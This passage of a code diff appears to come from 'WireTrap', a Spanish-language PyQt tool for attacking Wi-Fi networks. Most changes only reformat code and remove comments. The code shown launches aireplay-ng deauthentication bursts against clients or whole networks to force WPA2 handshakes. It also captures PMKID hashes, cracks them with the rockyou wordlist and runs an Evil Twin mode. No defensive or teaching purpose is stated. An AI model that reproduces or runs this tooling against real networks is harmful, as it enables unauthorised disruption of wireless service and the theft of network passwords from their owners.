             )
         else:
-            # Deauth puro sin Evil Twin: bucle continuo normal
             self.deauther.start(client_mac, self.selected_ap.bssid)
             self.log("Modo Deauth Puro (Evil Twin deshabilitado)")
+
         self.attacking = True
         self._update_attack_info()
         self.status_label.setText("● ATACANDO")
-        self.status_label.setStyleSheet(
-            "color: #e94560; font-weight: bold;"
-        )
+        self.status_label.setStyleSheet("color: #e94560; font-weight: bold;")
         self.btn_stop.setEnabled(True)
         self.btn_attack.setEnabled(False)
 
@@ -944,7 +1250,6 @@ class WireTrap(QMainWindow):
         title = QLabel("🔒 WireTrap: Ataques WPA2 (PMKID & Handshakes)")
         title.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
         header.addWidget(title)
-        
         header.addStretch()
 
         self.wpa2_dict_label = QLabel("Diccionario:")
@@ -952,12 +1257,12 @@ class WireTrap(QMainWindow):
         self.wpa2_dict_input = QLineEdit("/usr/share/wordlists/rockyou.txt")
         self.wpa2_dict_input.setMinimumWidth(250)
         self.wpa2_dict_input.setStyleSheet("background-color: #222; color: #fff; border: 1px solid #555; padding: 2px;")
-        
+
         self.wpa2_iface_label = QLabel("Interfaz Monitor (Alfa):")
         self.wpa2_iface_label.setFont(QFont("Monospace", 10))
         self.wpa2_iface_combo = QComboBox()
         self.wpa2_iface_combo.setMinimumWidth(150)
-        
+
         self.btn_wpa2_scan = QPushButton("▶ ESCANEAR REDES")
         self.btn_wpa2_scan.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
         self.btn_wpa2_scan.setStyleSheet("background-color: #00aa44; color: black; padding: 4px 10px;")
@@ -1014,7 +1319,7 @@ class WireTrap(QMainWindow):
         self.wpa2_log_text.setFont(table_font)
         self.wpa2_log_text.setStyleSheet("background: #000; color: #00ff00;")
         log_layout.addWidget(self.wpa2_log_text)
-        
+
         btn_layout = QHBoxLayout()
         self.btn_wpa2_start = QPushButton("▶ CAPTURAR PMKID")
         self.btn_wpa2_start.setFont(header_font)
@@ -1026,13 +1331,13 @@ class WireTrap(QMainWindow):
         self.btn_wpa2_deauth.setStyleSheet("background-color: #ffaa00; color: black; padding: 10px;")
         self.btn_wpa2_deauth.setEnabled(False)
         self.btn_wpa2_deauth.clicked.connect(self._on_wpa2_deauth_clicked)
-        
+
         self.btn_wpa2_stop = QPushButton("🛑 DETENER CAZA")
         self.btn_wpa2_stop.setFont(header_font)
         self.btn_wpa2_stop.setStyleSheet("background-color: #aa0000; color: white; padding: 10px;")
         self.btn_wpa2_stop.setEnabled(False)
         self.btn_wpa2_stop.clicked.connect(self._stop_wpa2_attack)
-        
+
         btn_layout.addWidget(self.btn_wpa2_start)
         btn_layout.addWidget(self.btn_wpa2_deauth)
         btn_layout.addWidget(self.btn_wpa2_stop)
@@ -1040,7 +1345,7 @@ class WireTrap(QMainWindow):
 
         splitter.addWidget(log_group)
         splitter.setSizes([800, 600])
-        layout.addWidget(splitter, 1)  # Stretch factor 1 to push everything up and consume space
+        layout.addWidget(splitter, 1)
 
     def _on_wpa2_scan_clicked(self):
         if self.scanner and self.scanner.scanning:
@@ -1062,37 +1367,34 @@ class WireTrap(QMainWindow):
 
             self.btn_wpa2_scan.setText("🛑 DETENER ESCANEO")
             self.btn_wpa2_scan.setStyleSheet("background-color: #aa0000; color: white; padding: 4px 10px;")
-            
             self.wpa2_status.setText("● BUSCANDO REDES")
             self.wpa2_status.setStyleSheet("color: #00ff88; font-weight: bold;")
-            
             self.wpa2_ap_table.setRowCount(0)
             self.selected_ap = None
 
     def _on_wpa2_deauth_clicked(self):
-        """Lanza aireplay-ng contra un cliente si existe, o en broadcast"""
         if not self.selected_ap: return
         iface = self.wpa2_iface_combo.currentText()
-        
+
         ap = self.scanner.aps.get(self.selected_ap.bssid)
         client_mac = "FF:FF:FF:FF:FF:FF"
         target_name = "la red entera (Broadcast)"
-        
+
         if ap and len(ap.clients) > 0:
             client_mac = list(ap.clients)[0]
             target_name = f"al cliente {client_mac}"
-            
+
         self.log_wpa2(f"\\n[💥] RÁFAGA HÍBRIDA: Expulsando a {target_name} de {self.selected_ap.bssid} para forzar handshakes...")
-        
+
         def run_deauth():
             import subprocess
             try:
                 subprocess.run([
                     "aireplay-ng", "-0", "15", "-a", self.selected_ap.bssid, "-c", client_mac, iface
                 ], capture_output=True, timeout=10)
-            except Exception as e:
+            except Exception:
                 pass
-                
+
         import threading
         threading.Thread(target=run_deauth, daemon=True).start()
 
@@ -1108,12 +1410,12 @@ class WireTrap(QMainWindow):
         if not self.selected_ap:
             QMessageBox.warning(self, "Error", "Selecciona una red de la tabla.")
             return
-            
+
         if self.scanner:
             self.scanner.stop()
-            
-        self.log_wpa2(f"\\n[⏳] Iniciando captura silenciosa sobre la red (el PCAP absorberá tráfico en background)...")
-            
+
+        self.log_wpa2(f"\\n[⏳] Iniciando captura silenciosa sobre la red...")
+
         if self.selected_ap.channel:
             import subprocess
             iface_mon = self.wpa2_iface_combo.currentText()
@@ -1122,12 +1424,12 @@ class WireTrap(QMainWindow):
 
         self.wpa2_engine = WPA2Crypto(self.wpa2_iface_combo.currentText())
         self.wpa2_engine.wordlist = self.wpa2_dict_input.text()
-        self.wpa2_engine.on_log       = lambda m: self.bridge.wpa2_log_message.emit(m)
-        self.wpa2_engine.on_hash_ready = lambda f: self.bridge.wpa2_log_message.emit(f"[🔑] Hash listo para crackear: {f}")
-        self.wpa2_engine.on_success   = lambda f: self.bridge.pmkid_success.emit(f)
-        self.wpa2_engine.on_error     = lambda e: self.bridge.pmkid_error.emit(e)
-        self.wpa2_engine.on_stopped   = self.bridge.attack_stopped.emit
-        
+        self.wpa2_engine.on_log        = lambda m: self.bridge.wpa2_log_message.emit(m)
+        self.wpa2_engine.on_hash_ready = lambda f: self.bridge.wpa2_log_message.emit(f"[🔑] Hash listo: {f}")
+        self.wpa2_engine.on_success    = lambda f: self.bridge.pmkid_success.emit(f)
+        self.wpa2_engine.on_error      = lambda e: self.bridge.pmkid_error.emit(e)
+        self.wpa2_engine.on_stopped    = self.bridge.attack_stopped.emit
+
         self.wpa2_engine.start_pmkid_attack(self.selected_ap.bssid)
         self.wpa2_status.setText("● ATACANDO")
         self.wpa2_status.setStyleSheet("color: #e94560; font-weight: bold;")
@@ -1146,7 +1448,6 @@ class WireTrap(QMainWindow):
 
     def _on_pmkid_success(self, file_path):
         self.log_wpa2(f"🏆 ¡Hash procesado con éxito!")
-        # Stop attack UI triggers since it's going into crack mode
         self.wpa2_status.setText("● CRACKEANDO")
         self.wpa2_status.setStyleSheet("color: #ffaa00; font-weight: bold;")
         self.btn_wpa2_stop.setEnabled(False)
@@ -1170,15 +1471,10 @@ class WireTrap(QMainWindow):
         else:
             self.wpa2_log_text.append(f"<span style='color: #00ff00;'>[{ts}] {safe_msg}</span>")
 
-    # ── MÓDULOS DEL ESCÁNER ───────────────────────────────────
-
     def _on_stop_clicked(self):
         if self.deauther:
             self.deauther.stop()
         if self.evil_twin:
-            # Anular el callback on_stopped antes de parar para evitar
-            # que dispare attack_stopped dos veces (una aquí abajo y
-            # otra desde el propio evil_twin al terminar).
             self.evil_twin.on_stopped = None
             self.evil_twin.stop()
         if self.sniffer:
@@ -1186,8 +1482,6 @@ class WireTrap(QMainWindow):
         if self.scanner:
             self.scanner.stop()
         self.bridge.attack_stopped.emit()
-
-    # ── Log ───────────────────────────────────────────────────
 
     def log(self, message: str):
         from datetime import datetime
